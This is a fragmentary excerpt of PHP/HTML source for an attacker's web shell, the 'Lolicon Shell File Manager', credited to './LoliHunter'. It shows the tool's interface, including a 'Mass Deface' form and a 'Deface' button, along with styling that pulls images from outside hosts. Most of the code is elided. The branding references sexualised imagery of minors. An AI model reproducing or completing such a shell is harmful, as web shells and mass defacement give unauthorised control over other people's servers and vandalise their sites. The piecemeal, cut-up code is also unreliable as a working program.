...
<title>&#12525;&#12522;&#12467;&#12531; File Manager</title>
<body>
<style>
body{
font-family: "Racing Sans One", cursive;
background:url("https://jindalelec.co.ke/maxresdefault%20(1).jpg") repeat;
background-size:100%;
...
<BODY>
<H1><center>Lolicon Shell File Manager</center></H1><br><center><a href="njirr"><img src="http://img01.deviantart.net/7880/i/2014/232/1/4/loli_render_4_by_nunnallyrey-d7w07i9.png" width="244" height="370"></a>
<br>
...
echo "<font face='Electrolize'>";
echo "<center><br><br><H1>Mass Deface</H1><br><br><form method='POST'>";
...
echo "<input type='submit' value='Deface'></form></center><br><br>";
...
echo '<br /><footer style="position:fixed; left:1px; right:0px; bottom:0px; border-top: 1px solid white ;background-color:#222"><center>-= Lolicon Shell File Manager <font color="red">v'.VERSION.'</font>, c0d3d By <font color="red">./LoliHunter <font color=aqua>=-</font>
</footer>
</BODY>
</HTML>';
function perms($file){
